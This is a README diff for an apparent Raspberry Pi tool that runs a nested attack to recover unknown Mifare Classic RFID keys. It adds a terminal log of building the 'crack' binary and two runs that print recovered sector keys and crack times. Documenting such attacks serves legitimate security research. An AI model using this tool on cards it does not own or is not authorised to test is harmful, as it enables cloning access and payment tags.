@@ -11,3 +11,33 @@ This attack recovers unknown keys from a Mifare Classic PICC (RFID Tag) if only 
 * Clone this repo
 * Configure attack vectors (block with known key, attack addr) on main.cpp
 * make
+
+```
+pi@raspberrypi:~ $ cd MFRC522_nested_attack/
+pi@raspberrypi:~/MFRC522_nested_attack $ make
+g++ -c --std=c++11 src/main.cpp -o build/main.o
+g++ -c --std=c++11 src/RC522.cpp -o build/RC522.o
+g++ -c --std=c++11 src/MFrec.cpp -o build/MFrec.o
+gcc -c src/crapto1.c -o build/crapto1.o
+gcc -c src/crypto1.c -o build/crypto1.o
+g++ build/main.o build/RC522.o build/MFrec.o build/crapto1.o build/crypto1.o -o crack -lpthread -lwiringPi
+pi@raspberrypi:~/MFRC522_nested_attack $ ./crack
+Recovering keys.. this may take some time
+<35.19>Round 1: Found 1448025 possible keys, with most repeated key: 4
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+KEY FOUND TO BE:                11ffffffffff
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Time to crack: 35.19
+Timeout
+pi@raspberrypi:~/MFRC522_nested_attack $ ./crack
+Recovering keys.. this may take some time
+<46.7911>Round 1: Found 1460708 possible keys, with most repeated key: 4
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+KEY FOUND TO BE:                11ff22ff43f4
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Time to crack: 46.7911
+Timeout
+pi@raspberrypi:~/MFRC522_nested_attack $ make clean
+rm crack build/main.o build/RC522.o build/MFrec.o build/crapto1.o build/crypto1.o
+pi@raspberrypi:~/MFRC522_nested_attack $
+```
